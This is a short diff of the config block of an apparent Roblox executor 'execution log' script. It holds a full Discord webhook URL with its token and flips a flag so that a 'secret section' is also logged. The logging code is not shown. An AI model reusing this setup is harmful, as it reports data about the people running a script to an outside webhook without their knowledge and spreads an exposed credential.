@@ -1,7 +1,7 @@
 --// Config
 getgenv().whscript = "jump"        --Change to the name of your script
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1369009406989041735/4AqyB6IhlFO137TnsFo973NFTHh7d3Ya98dKH0STXwaHzE2WyLo9AOI1Mm4PZSwZR8nv"  --Put your Webhook Url here
-getgenv().ExecLogSecret = false                --decide to also log secret section
+getgenv().ExecLogSecret = true                --decide to also log secret section
 
 --// Execution Log Script
 local ui = gethui()
